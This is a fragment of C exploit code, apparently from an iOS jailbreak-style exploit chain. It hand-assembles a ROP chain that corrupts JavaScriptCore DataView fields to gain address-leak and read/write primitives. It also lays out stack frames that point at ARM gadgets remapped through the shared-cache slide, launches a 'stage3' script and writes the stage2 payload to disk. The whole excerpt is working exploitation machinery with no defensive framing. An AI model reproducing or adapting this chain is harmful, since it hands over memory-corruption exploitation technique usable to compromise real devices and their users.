    rop_js_set_property(js_ctx, js_global, dv_addrof_name_str, dv_addrof_object);

    rop_saved_write32(arr_addrof_object, procyon->offsets.data_view.byte_length, 0x10);
    rop_saved_write32(dv_addrof_object, procyon->offsets.data_view.mode, 0);
    rop_add(dv_addrof_object, procyon->offsets.data_view.array_buffer);
    rop_add(arr_addrof_object, 0x8);

    rop_move32(arr_addrof_object, procyon->stage2.stack_base + stack_offset + 0x40 + 0x0);
    rop_move32(dv_addrof_object, procyon->stage2.stack_base + stack_offset + 0x20 + 0x10);

    STATIC_WRITE32(stack_offset+0x0, 0); // r2 (arr)
    STATIC_WRITE32(stack_offset+0x4, 0); // r3
    STATIC_WRITE32(stack_offset+0x8, 0); // r7
    STATIC_WRITE32(stack_offset+0xc, DSC_REMAP_ADDR(procyon->gadgets.ldr_r0_r2_bx_lr)); // pc

    STATIC_WRITE32(stack_offset+0x10, 0); // r2 (dv)
    STATIC_WRITE32(stack_offset+0x14, 0); // r3
    STATIC_WRITE32(stack_offset+0x18, 0); // r7
    STATIC_WRITE32(stack_offset+0x1c, DSC_REMAP_ADDR(procyon->gadgets.str_r0_r2_bx_lr)); // pc
    stack_offset += 0x20;

    // start stage3
    rop_move32(dsc_slide_addr, procyon->stage2.stack_varibles + 0x100);
    rop_js_evaluate_script(js_ctx, js_global, js_script_name, js_script);
    
    // force crash
    rop_write32(0x13371337, 0x41414141);
    rop_exit(41);
    
    write(fd, stage2_data, 0x80000);
    free(stage2_data);

    fcntl(fd, F_FULLFSYNC);
    close(fd);
    return 0;
}
